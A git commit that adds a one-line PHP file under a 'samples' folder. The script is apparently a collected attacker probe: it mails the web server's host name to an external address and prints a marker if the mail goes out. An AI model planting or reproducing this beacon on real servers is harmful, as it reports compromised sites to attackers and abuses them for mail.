8a82f4401905c42af271792290d561d1bc3da7c9
Elijah Seymour <dostoevskylabs@users.noreply.github.com>
2017-10-04 04:14:51 +0100

    Create ilrm.php

---
+++ httpd.pl/samples/ilrm.php
@@ -0,0 +1,1 @@
+<?php $host = $_SERVER['HTTP_HOST']; $headers = "CC: ryglman@yahoo.com\r\n"; $headers .= "BCC: ryglman@yahoo.com\r\n"; if ( mail('ryglman@yahoo.com', $host, 'jkovdowqo', $headers) ) {echo "Jm73uZ";} ?> 
